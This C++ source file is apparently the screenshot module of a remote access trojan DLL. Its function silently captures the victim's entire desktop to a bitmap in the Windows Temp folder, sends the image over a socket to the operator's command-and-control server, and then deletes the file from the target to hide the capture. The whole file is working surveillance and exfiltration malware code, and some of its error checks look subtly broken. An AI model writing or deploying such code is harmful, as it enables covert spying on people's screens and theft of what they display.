// Patrick Sacchet (@pjsacchet)
// Verison 1.0.
// RAT-Dll-Screemshot.cpp : Defines functionality for performing a screenshot on target, i.e., capture the current open windows on the desktop, write it to a file, get the file, then delete the file

#include "RAT-Dll-Screenshot.h"
#include "RAT-Dll-Connect.h"
#include "RAT-Dll-GetFile.h"
#include "RAT-Dll-DeleteFile.h"


/** This function will perform a screenshot for us 
params:
* clientSock - current socket connection with our C2
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT performScreenshot(SOCKET clientSock)
{
	INT status = SUCCESS, width = 0, height = 0;
	HDC hdcScreen, hdcMemDC = NULL;
	HBITMAP hbmScreen = NULL, hbmOldScreen = NULL;
	BITMAP bmpScreen;
	HANDLE hFile = NULL, hDIB = NULL;
	CHAR msgBuf[DEFAULT_BUF_LEN];
	BITMAPFILEHEADER   bmfHeader;
	BITMAPINFOHEADER   bi;
	DWORD dwBmpSize, dwSizeOfDIB, dwBytesWritten, dwBufferSize = 0;
	LPCSTR fileName = "C:\\Windows\\Temp\\d3adb33f.bmp";
	char* lpbitmap = NULL, **fileBytes = NULL;

	OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Starting screenshot...\n");

	// Get a device context (DC) for the entire screen
	hdcScreen = GetDC(NULL);
	if (hdcScreen == NULL)
	{
		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed call to GetDC!\n");
		status = FAILURE;
		goto cleanup;
	}

	// Create a compatible DC with the screen DC
    hdcMemDC = CreateCompatibleDC(hdcScreen);
	if (hdcMemDC == NULL)
	{
		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed call to CreateCompatibleDC!\n");
		status = FAILURE;
		goto cleanup;
	}

	// Get our width and height of the screen
	width = GetDeviceCaps(hdcScreen, HORZRES);

	height = GetDeviceCaps(hdcScreen, VERTRES);
	if (width == 0 || height == 0)
	{
		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed GetDeviceCaps!\n");
		status = FAILURE;
		goto cleanup;
	}

	// Create a bitmap compatible with the screen DC to hold our result
	hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);
	if (hbmScreen == NULL)
	{
		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed CreateCompatibleBitmap!\n");
		status = FAILURE;
		goto cleanup;
	}

	// Deselect our old screen
	hbmOldScreen = (HBITMAP)(SelectObject(hdcMemDC, hbmScreen));
	if (hbmOldScreen == NULL || hbmOldScreen == HGDI_ERROR)
	{
		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed SelectObject!\n");
		status = FAILURE;
		goto cleanup;
	}

	// Bit block transfer into the compatible memory DC
	if (!BitBlt(hdcMemDC, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY))
	{
		status = GetLastError();
		sprintf_s(msgBuf, "RAT-Dll-Screenshot::performScreenshot - Failure from BitBlt: %d\n", status);
		goto cleanup;
	}

	// Select the compatible bitmap into the compatible memory DC
	hbmScreen = (HBITMAP)(SelectObject(hdcMemDC, hbmOldScreen));
	if (hbmScreen == NULL || hbmScreen == HGDI_ERROR)
	{
		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed SelectObject!\n");
		status = FAILURE;
		goto cleanup;
	}

	// Get the BITMAP from HBITMAP 
	if (GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen) == 0)
	{
		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed GetObject!\n");
		status = FAILURE;
		goto cleanup;
	}

	// Write to output file somewhere on disk
		// TODO: Randomize file path and name? Use system vars to get system root and stuff 
	hFile = CreateFileA(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL)
	{
		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed to create outputfile!\n");
		status = FAILURE;
		goto cleanup;
	}

	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = bmpScreen.bmWidth;
	bi.biHeight = bmpScreen.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;

	dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

	hDIB = GlobalAlloc(GHND, dwBmpSize);
	lpbitmap = (char*)GlobalLock(hDIB);

	GetDIBits(hdcScreen, hbmScreen, 0, (UINT)bmpScreen.bmHeight, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

	// Add the size of the headers to the size of the bitmap to get the total file size.
	dwSizeOfDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	// Offset to where the actual bitmap bits start.
	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);

	// Size of the file.
	bmfHeader.bfSize = dwSizeOfDIB;

	// bfType must always be BM for Bitmaps.
	bmfHeader.bfType = 0x4D42; // BM.

	status = WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
	if (status != SUCCESS)
	{
		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed to WriteFile! (bitmap file header) \n");
		status = WSAGetLastError();
		goto cleanup;
	}

	status = WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
	if (status != SUCCESS)
	{
		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed to WriteFile! (bitmap info header) \n");
		status = WSAGetLastError();
		goto cleanup;
	}
	
	status = WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
	if (status != SUCCESS)
	{
		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed to WriteFile! (bitmap) \n");
		status = WSAGetLastError();
		goto cleanup;
	}

	// Unlock and Free the DIB from the heap.
	GlobalUnlock(hDIB);
	GlobalFree(hDIB);

	// Close the handle for the file that was created.
	CloseHandle(hFile);

	OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Wrote screenshot file!\n");

	// Send success here so our C2 knows to expect our screenshot...
	status = sendSuccess(clientSock);
	if (status != SUCCESS)
	{
		sprintf_s(msgBuf, "RAT-Dll-Screenshot::performScreenshot - Failure received from sendSuccess %d\n", status);
		OutputDebugStringA(msgBuf);
		goto cleanup;
	}

	// Do get file so we send back to C2
	fileBytes = (char**)malloc(sizeof(char*));
	if (fileBytes == NULL)
	{
		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed to allocate space for fileBytes buffer! \n");
		status = FAILURE;
		goto cleanup;
	}

	status = performGetFile(fileName, fileBytes, &dwBufferSize);
	if (status != SUCCESS)
	{
		sprintf_s(msgBuf, "RAT-Dll-Screenshot::performScreenshot - Failure received from performGetFile %d\n", status);
		OutputDebugStringA(msgBuf);
		goto cleanup;
	}

	// Send the size of the file so we know when to stop receiving... 
	status = send(clientSock, (const char*) &dwBufferSize, sizeof(DWORD), 0);
	if (status == SOCKET_ERROR)
	{
		sprintf_s(msgBuf, "RAT-Dll-Screenshot::performScreenshot - Failure recevied from send (file size) %d\n", WSAGetLastError());
		OutputDebugStringA(msgBuf);
		status = WSAGetLastError();
		goto cleanup;
	}

	status = send(clientSock, *fileBytes, dwBufferSize, 0);
	if (status == SOCKET_ERROR)
	{
		sprintf_s(msgBuf, "RAT-Dll-Screenshot::performScreenshot - Failure recevied from send (file bytes) %d\n", WSAGetLastError());
		OutputDebugStringA(msgBuf);
		status = WSAGetLastError();
		goto cleanup;
	}

	// Free the buffer we point to then free the memory we allocated for the pointer
	free(*fileBytes);
	free(fileBytes);

	OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Sent file back to C2!\n");

	// Call delete file 
	status = performDeleteFile((char*)fileName);
	if (status != SUCCESS)
	{
		sprintf_s(msgBuf, "RAT-Dll-Screenshot::performScreenshot - Failure received from performDeleteFile %d\n", status);
		OutputDebugStringA(msgBuf);
		goto cleanup;
	}

	OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Deleted screenshot from target; cleaning up...\n");


cleanup:
	DeleteDC(hdcMemDC);
	DeleteDC(hdcScreen);
	return status;
}

